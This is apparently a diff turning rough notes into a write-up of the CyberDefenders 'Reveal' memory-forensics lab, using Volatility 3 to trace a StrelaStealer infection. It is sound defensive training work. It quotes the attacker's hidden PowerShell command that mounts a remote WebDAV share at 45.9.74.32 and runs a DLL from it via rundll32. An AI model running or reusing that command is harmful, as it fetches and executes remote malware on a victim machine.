@@ -1,35 +1,116 @@
+# Reveal Walkthrough
 
+## Overview
 
-setting up enviroment
+In this CyberDefenders lab, I investigated a 2 GB Windows memory dump after suspicious activity was detected on an internal workstation. I used Volatility 3 to identify the malicious process, trace its parent, review its command line, and connect the activity to the StrelaStealer malware family.
 
-<img width="1286" height="502" alt="Screenshot 2026-08-17 181857" src="https://github.com/user-attachments/assets/ec174655-860f-4b1d-93e9-7399073cfc70" />
+## Challenge Details
 
-<img width="966" height="40" alt="Screenshot 2026-08-17 182624" src="https://github.com/user-attachments/assets/ced3d744-5272-4d15-aa08-d3a4ab28f77b" />
+| Field | Details |
+|---|---|
+| Platform | CyberDefenders |
+| Category | Memory Forensics and Incident Response |
+| Status | Completed |
+| Lab | [Reveal](https://cyberdefenders.org/blueteam-ctf-challenges/reveal/) |
 
+## Tools Used
 
-1st flag
-<img width="1294" height="359" alt="Screenshot 2026-08-17 183413" src="https://github.com/user-attachments/assets/a6aefb3c-8e3d-4e90-b2cc-8bb89069fdb2" />
+- Kali Linux
+- Volatility 3
+- VirusTotal
 
-2nd flag
+## Environment Setup
 
-<img width="952" height="39" alt="Screenshot 2026-08-17 184056" src="https://github.com/user-attachments/assets/6d251102-5071-41bd-a3a5-f94eabd8b063" />
+I set up Volatility 3 in Kali Linux and started by profiling the memory image.
 
-<img width="1291" height="182" alt="Screenshot 2026-08-17 184203" src="https://github.com/user-attachments/assets/b2610ef3-59a9-4c13-83fc-a81bf714acb1" />
+```bash
+python vol.py -f <path_to_memory_dump> windows.info
+```
 
-3rd flag and 4th flag
+The output identified the system as Windows 10, showed the NT root as `C:\Windows`, and gave a memory capture time of `2024-07-15 07:08:00`.
 
-<img width="1042" height="41" alt="Screenshot 2026-08-17 184404" src="https://github.com/user-attachments/assets/5a86380f-9f16-4126-9e80-95377128ca7f" />
+<img width="1286" height="502" alt="Volatility 3 environment setup in Kali Linux" src="https://github.com/user-attachments/assets/ec174655-860f-4b1d-93e9-7399073cfc70" />
 
+<img width="966" height="40" alt="Windows memory image profile information" src="https://github.com/user-attachments/assets/ced3d744-5272-4d15-aa08-d3a4ab28f77b" />
 
-<img width="1290" height="42" alt="Screenshot 2026-08-17 184321" src="https://github.com/user-attachments/assets/82d4def7-60fc-48d6-b4ce-c12df5ca633f" />
+## Questions and Findings
 
- 5th flag explain it
+### Q1: What is the malicious process?
 
- 6th flag
- <img width="1201" height="378" alt="Screenshot 2026-08-17 185523" src="https://github.com/user-attachments/assets/9e86b10a-2948-473b-a434-eaae5c8a2295" />
+**Answer:** `powershell.exe`
 
-7ht flag expand 
+I used the `windows.malfind` plugin and found a suspicious PowerShell process with PID `3692`.
 
-<img width="1871" height="951" alt="Screenshot 2026-08-17 185710" src="https://github.com/user-attachments/assets/63e8a823-c45f-43af-9564-9edd12405405" />
+```bash
+python vol.py -f <path_to_memory_dump> windows.malfind
+```
 
- 
+<img width="1294" height="359" alt="Suspicious PowerShell process found with malfind" src="https://github.com/user-attachments/assets/a6aefb3c-8e3d-4e90-b2cc-8bb89069fdb2" />
+
+### Q2: What is the parent PID of the malicious process?
+
+**Answer:** `4210`
+
+I used `windows.pstree` to trace PID 3692 back to its parent. The parent process had PID 4210 and may have already ended before the memory was captured.
+
+```bash
+python vol.py -f <path_to_memory_dump> windows.pstree | grep "3692"
+```
+
+<img width="952" height="39" alt="Filtering the process tree for PID 3692" src="https://github.com/user-attachments/assets/6d251102-5071-41bd-a3a5-f94eabd8b063" />
+
+<img width="1291" height="182" alt="Parent PID 4210 in the process tree" src="https://github.com/user-attachments/assets/b2610ef3-59a9-4c13-83fc-a81bf714acb1" />
+
+### Q3 and Q4: What second-stage file and remote share were used?
+
+**Answers:** File: `3435.dll` | Shared directory: `davwwwroot`
+
+The PowerShell command connected to the remote WebDAV share and used `rundll32` to run `3435.dll` directly from it.
+
+```powershell
+powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
+```
+
+<img width="1042" height="41" alt="Second-stage DLL file in the PowerShell command" src="https://github.com/user-attachments/assets/5a86380f-9f16-4126-9e80-95377128ca7f" />
+
+<img width="1290" height="42" alt="Remote davwwwroot share in the command line" src="https://github.com/user-attachments/assets/82d4def7-60fc-48d6-b4ce-c12df5ca633f" />
+
+### Q5: What MITRE ATT&CK sub-technique matches this execution method?
+
+**Answer:** `T1218.011` - Signed Binary Proxy Execution: Rundll32
+
+The attacker abused the trusted Windows utility `rundll32.exe` to execute a malicious DLL. This method can make malicious execution look like normal Windows activity.
+
+### Q6: Which username ran the malicious process?
+
+**Answer:** `Elon`
+
+I used the `windows.getsids.GetSIDs` plugin to identify the account tied to PID 3692. The results also showed that the account had administrator access and a high integrity level.
+
+```bash
+python vol.py -f <path_to_memory_dump> windows.getsids.GetSIDs | grep "3692"
+```
+
+<img width="1201" height="378" alt="Elon user SID and privileges for PID 3692" src="https://github.com/user-attachments/assets/9e86b10a-2948-473b-a434-eaae5c8a2295" />
+
+### Q7: What is the malware family?
+
+**Answer:** `StrelaStealer`
+
+I searched the remote IP address `45.9.74.32` in VirusTotal and reviewed the related files. The results connected the activity to StrelaStealer, an infostealer known for targeting email account credentials.
+
+<img width="1871" height="951" alt="VirusTotal evidence connecting the IP to StrelaStealer" src="https://github.com/user-attachments/assets/63e8a823-c45f-43af-9564-9edd12405405" />
+
+## Key Findings
+
+- A hidden PowerShell process connected to `45.9.74.32` over port `8888`.
+- The command loaded `3435.dll` from the `davwwwroot` WebDAV share with `rundll32.exe`.
+- The malicious process ran under the `Elon` account with elevated access.
+- Threat intelligence connected the activity to StrelaStealer.
+
+## Lessons Learned
+
+- Process trees and command-line data are important for rebuilding an attack from memory.
+- Memory evidence and threat intelligence work well together when identifying a malware family.
+
+Built and Documented by Aluseni Waritay
